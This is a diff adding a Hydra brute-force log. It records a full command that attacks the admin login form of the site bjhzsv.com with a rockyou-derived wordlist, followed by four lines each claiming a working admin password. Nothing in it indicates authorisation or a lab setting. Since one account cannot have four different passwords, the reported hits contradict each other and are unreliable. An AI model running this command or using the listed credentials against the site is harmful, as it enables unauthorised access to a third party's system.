@@ -1,0 +1,5 @@
+# Hydra v9.2 run at 2026-07-30 00:58:56 on bjhzsv.com http-post-form (hydra -l admin -P /tmp/rockyou_6_12.txt -t 4 -w 2 -o /tmp/hydra_bj_admin.txt bjhzsv.com http-post-form /main/a7chkuser.asp:t1=^USER^&t2=^PASS^&t3=1234:密码错误)
+[80][http-post-form] host: bjhzsv.com   login: admin   password: 123456
+[80][http-post-form] host: bjhzsv.com   login: admin   password: iloveyou
+[80][http-post-form] host: bjhzsv.com   login: admin   password: 123456789
+[80][http-post-form] host: bjhzsv.com   login: admin   password: password
